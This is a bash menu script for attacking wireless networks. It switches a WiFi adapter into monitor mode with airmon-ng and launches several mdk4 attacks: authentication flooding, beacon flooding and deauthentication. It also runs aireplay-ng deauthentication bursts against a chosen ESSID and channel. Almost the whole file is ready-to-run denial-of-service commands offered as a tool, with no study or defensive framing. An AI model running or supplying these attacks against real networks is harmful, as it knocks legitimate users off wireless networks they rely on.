#!/bin/bash
clear
readonly ru1=$(dirname $(readlink -f "$0"))
readonly ru=${ru1//language}
clear
source /$ru/desig
read -p "WIFI module: " module
airmon-ng stop ${module}
airmon-ng start $module
clear
while true; do
source /$ru/desig
         echo -e "\e[33mWhat will be the attack? "
         echo ""
	 echo -e  "\e[33m[1] Attack A"
	 echo  "[2] Attack B"
	 echo  "[3] Attack C"
	 echo  "[4] Attack D"
	 echo  "[5] Attack E"
	 echo ""
	 echo -e "\e[31m[8] Help"
	 echo -e "[9] TURN BACK\e[0m"
	 read -p "Attack> " attack
	 case $attack in
        [1Aa] ) clear
	source /$ru/desig
	gnome-terminal --geometry=1x1 --command="airodump-ng ${module}mon"
         mdk4 ${module}mon a;;
         [2Bb] ) 
         clear
        source /$ru/desig
	 mdk4 ${module}mon b -ams 500;;
         [3Cc])
         clear
	source /$ru/desig
	 python $ru/source/source -i ${module}mon
        clear;;
	 [4Dd])
	 clear
	source /$ru/desig
	 mdk4 ${module}mon d;;
	[99turnback])
	clear
	source /$ru/desig
	source $ru/wkbye.sh;;
	[5Ee])
	clear
         gnome-terminal --geometry=132x24 --command="airodump-ng ${module}mon"
        clear
	source /$ru/desig 
	read -p "Channel: " ch
         read -p "ESSID: " essid
         read -p "Number of packages: " pack 
	 iwconfig ${module}mon channel $ch
	clear
	source /$ru/desig
         aireplay-ng -0 $pack -e $essid ${module}mon;;
	[8help]) 
	clear
	source $ru/help/helpen.sh;;
	 * ) 
	  clear
source /$ru/desig ;;
esac
done
